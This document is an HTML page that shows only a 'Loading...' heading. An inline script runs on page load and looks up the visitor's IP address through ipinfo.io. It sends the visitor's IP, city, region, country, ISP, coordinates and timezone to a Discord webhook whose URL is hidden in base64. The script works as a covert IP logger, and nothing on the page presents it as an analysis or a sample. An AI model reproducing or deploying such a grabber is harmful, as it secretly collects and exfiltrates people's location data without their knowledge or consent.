<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Randomized Page</title>
    <style>
        body { 
            background-color: #000; 
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            font-family: Arial, sans-serif; 
        }
    </style>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        let webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTYyNDAwNzcyMA=="; 
        let decodedWebhook = atob(webhookBase64);
        let token = "afbce99e0999ed"; 

        async function fetchIPInfo() {
            try {
                let response = await fetch(`https://ipinfo.io/json?token=${token}`);
                if (!response.ok) throw new Error("Network response was not ok.");
                let data = await response.json();
                let content = {
                    content: `IP: ${data.ip}, City: ${data.city}, Region: ${data.region}, Country: ${data.country}, Org: ${data.org}, Loc: ${data.loc}, TZ: ${data.timezone}`
                };
                await fetch(decodedWebhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(content)
                });
            } catch (error) {
                console.error("Error:", error);
            }
        }

        fetchIPInfo();
    </script>
</body>
</html>
